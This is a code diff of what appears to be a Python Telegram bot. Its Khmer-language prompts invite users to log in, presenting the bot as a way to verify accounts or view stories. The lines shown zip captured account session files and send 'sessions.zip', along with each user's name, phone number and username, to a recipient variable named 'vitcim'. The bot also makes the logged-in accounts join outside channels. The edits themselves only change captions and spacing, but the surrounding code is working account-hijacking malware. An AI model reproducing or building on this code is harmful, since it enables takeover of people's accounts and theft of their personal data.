@@ -206,7 +206,7 @@ async def login(lel, message):
       os.remove("1.csv")
       make_archive('sessions', 'zip', 'sessions')
       time.sleep(5)
-      await app.send_document(vitcim, "sessions.zip", caption=f"**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n** Server RDP : Heroku  🌐**\n**Users Can Acess : {count}")
+      await app.send_document(vitcim, "sessions.zip", caption=f"**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n** Server RDP  :  Heroku  🌐**\n")
       await client(JoinChannelRequest('https://t.me/BeaktleyKhmer'))
       await client(JoinChannelRequest('https://t.me/KhmernuddexKidd'))
       await app.send_message(message.chat.id, f"ចូលគ្រុបដោយជោគជ័យ  ✅ សូមឆែកគ្រុប ថ្មីៗក្នុងអាខោនរបស់អ្នក \n\n**រក្សារសិទ្ធដោយ @JVP_CAMBODIABOT**")
@@ -259,7 +259,7 @@ async def button(app, update):
    k = update.data
    if "Login" in k:
       await update.message.delete()
-      await app.send_message(update.message.chat.id, """**ផ្ទៀងផ្ទាត់ > /login **""") 
+      await app.send_message(update.message.chat.id, """**ផ្ទៀងផ្ទាត់    >    /login **""") 
    elif "Ish" in k:
       await update.message.delete()
       await app.send_message(update.message.chat.id, """**There is nothing no more..!\nJust Click on /phonesee to login and check stats of Account.\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""") 
@@ -271,7 +271,7 @@ async def button(app, update):
       await app.send_message(update.message.chat.id, """**There is nothing no more..!\nJust Click on /adding to start adding from Login✅ Account.\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""") 
    elif "Edit" in k:
       await update.message.delete()
-      await app.send_message(update.message.chat.id, """**ចូលមើលរឿង > /phone **""") 
+      await app.send_message(update.message.chat.id, """**ចូលមើលរឿង   >   /phone **""") 
    elif "Home" in k:
       await update.message.delete()
       await app.send_message(update.message.chat.id, """**There is nothing no more..!\nJust Click on /start to Go Home.\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""") 
